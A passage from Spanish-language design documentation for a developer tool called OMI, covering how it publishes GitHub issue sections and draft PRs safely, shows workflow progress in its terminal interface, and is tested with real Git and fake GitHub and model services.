- **Salida de comandos:** la sección lleva exit code y HEAD, no la salida, que queda sólo en el estado local porque nadie la revisa antes de publicar.
- **Comentarios viejos:** los que dejaron versiones anteriores quedan en GitHub; OMI no los borra ni los edita.

El cuerpo de un issue admite 65.536 caracteres. Si el pedido más la sección no entran, la sección se resume y lo dice en un aviso al principio: primero la evidencia queda con la última prueba de cada caso y cada lente con su primer hallazgo; si tampoco entra, queda una sección mínima (ruta, etapa y veredictos de los lentes) que nombra lo que omite. Nada se corta en silencio y el pedido nunca se toca. Si ni la mínima entra, no se escribe y OMI avisa.

La publicación guarda un recibo pendiente antes del push, valida repositorio/origin/branch y usa el SHA inmutable aprobado, sin force ni tags. Recupera sólo un draft abierto de esa rama/base/SHA con identidad y cuerpo exactos de este trabajo. Un PR ajeno o editado por una persona requiere intervención; no se sobrescribe ni se duplica. El PR draft conserva su propio cuerpo, con el artefacto completo del trabajo: se publica entero o falla pidiendo dividir la tarea; no se aprueba una spec silenciosamente truncada.

No hay garantía de atomicidad entre cambios humanos del issue y todas las acciones posteriores de Git/GitHub. Los checkpoints detectan cambios; no hay lock distribuido sobre la intención de la persona.

## Progreso en la TUI

`PROGRESO · #N` muestra ruta, etapa, actividad, pasos, checks observados y bloqueos. El detalle muestra también Foundations: revisión, origen, políticas y catálogo. Los eventos de lectura, comandos, preguntas y lentes actualizan la actividad sin esperar el refresco de recursos. El detalle incluye preguntas, evidencia, lentes e intentos anteriores. No convierte una tool exitosa ni un workflow verde de Actions en aprobación del PR.

El recorrido usa el catálogo de fases del harness y sus decisiones reales de ruta, no una lista paralela del renderer. Incluye pendientes, fases condicionales (Diagnóstico/Spec antes de conocer la ruta), no aplicables y los finales alternativos PR draft abierto/cierre sin cambio. `>` identifica la actual; los símbolos y textos distinguen avance sin depender del color. Un rojo esperado no hace fallar Implementar; los checks fallidos o interrumpidos conservan su significado observado. Un aviso de lente marca Verificar como △ **Con avisos**, durante la etapa y después de cumplida; sólo un `fail` de Seguridad la marca como fallida. La lateral muestra cuántos avisos hay y la pantalla 6 y `/omi-progress` los listan, uno por lente. El artefacto del issue y el PR draft traen la sección **Avisos de los lentes**, con el estado de cada lente pedido y sus hallazgos.

**6 · Progreso**, por Ctrl 6, pestaña/clic, paleta o `/omi-workflow`, muestra el recorrido completo y separa **Previsto** de **Real**. Usa desplazamiento de la vista de sólo lectura (flechas, PgUp/PgDn, Home/End y rueda) y Esc vuelve a Chat. La lateral muestra las etapas cuando entran todas, nunca una lista parcial que oculte la actual; en panes bajos mantiene su resumen, bloqueos, contadores y los otros bloques, con acceso indicado a la pantalla 6, sin scroll lateral. `/omi-progress` conserva el detalle.

La receta sólo prevé el ejecutor de Implementar. El modo real se observa desde tools ejecutadas en la sesión principal y tareas efectivamente iniciadas, no desde consultas status/result/cancel ni lotes sólo en cola. Se admite combinación inline/subagente; los lentes de Verificar se rotulan como llamadas aisladas, sin inventar una llamada a la tool subagent. No se afirma exclusividad ni éxito de una tarea por conocer su modo. Los metadatos durables son booleanos acotados por fase/vuelta, sin tareas, prompts ni outputs privados. Los estados anteriores siguen legibles con modo «sin observar»; restaurar no vuelve a lanzar jobs. Refresh los invalida y los eventos tardíos no acreditan otro pedido/vuelta.

El panel sólo pertenece al cwd/worktree/rama correctos, se reinicia al cambiar de sesión/árbol y prioriza bloqueos en panes bajos. Reemplaza el bloque Issue activo mientras hay un trabajo y respeta su visibilidad en Personalizar lateral; conserva Sesión, recursos y las demás preferencias. Usa el mismo renderer, temas y modales del workspace, sin otra interfaz web.

## Verificación del cambio

El arranque tiene sus propios tests, con Git, worktrees y sesiones reales y con GitHub y modelo falsos: pedido nuevo con un solo sí, issue existente sin duplicar, decir que no, token de un solo uso, guardas sin efectos y recarga sin kickoff. Dos tests de pty real recorren los dos caminos. El del panel: Enter en Issues, el sí, Esc en la clasificación y el harness arrancado en el worktree. El del agente: un pedido en el chat, la tool, un turno que termina sin seguir, el sí antes de crear el issue y de clasificar, y el harness en el worktree del issue nuevo. Los lentes tienen tests con Git real: la evidencia que reciben, los avisos que no frenan el PR draft, el bloqueo por un fail de Seguridad y un diff de más de 200.000 caracteres revisado por partes sin truncar, y ninguna llamada por encima del presupuesto, con la evidencia resumida y explícita cuando no entra. Los tests del flujo cubren las tres rutas con Git y comandos reales en repos temporales, modelos/GitHub falsos, consentimientos, invalidación, evidencia, recuperación, concurrencia, cancelación y panel estrecho/claro/oscuro. La sección del issue tiene cobertura del pedido byte a byte, marcadores rotos, contraste que la ignora, escape de contenido hostil (sin links, imágenes, autolinks, HTML ni menciones activos) y escrituras no confirmadas. Los acuerdos del chat, de citas aceptadas y rechazadas (modelo, tools, mensajes de OMI, inventadas y triviales). Las preguntas en tanda tienen tests del componente (lo que dibuja y cada tecla, también respuesta libre, elección múltiple, pestañas y cancelar), del contrato de `omi_ask` (esquema, sin UI, cancelar, opción frente a texto libre y el harness) y un PTY real que abre una tanda dentro del workspace, con resize y Esc. El creador de Foundations tiene tests del flujo con una UI falsa, sin KB, y los del arranque recorren sus tandas con teclas. Foundations tiene tests con un MCP falso por HTTP y el `createMcpExtension` real de Pi, que fallan si un bump de Pi cambia cómo se registran o ejecutan las tools MCP o cómo se reemplaza `builtin:mcp`; y cuentan los diálogos de aceptación, reutilización de permisos, cambio de etiqueta, `resume`, `replan`, rechazo, KB caída y bloque inválido o ajeno. La aprobación tiene cobertura específica de documento íntegro, comandos largos/multilínea y caracteres de control, navegación/resize/temas, decisiones negativas y revalidación durante la revisión. Una prueba con Pi en PTY real recorre 80×24, resize a 132×40 y vuelta, temas claro/oscuro, navegación hasta el final del comando, cancelar y aprobar explícitamente con GitHub falso; no es una evaluación visual humana. El empaquetado comprueba el binario instalado. No equivalen a una prueba contra GitHub/OMI real ni a una evaluación de calidad de modelos: esas pruebas requieren una persona.
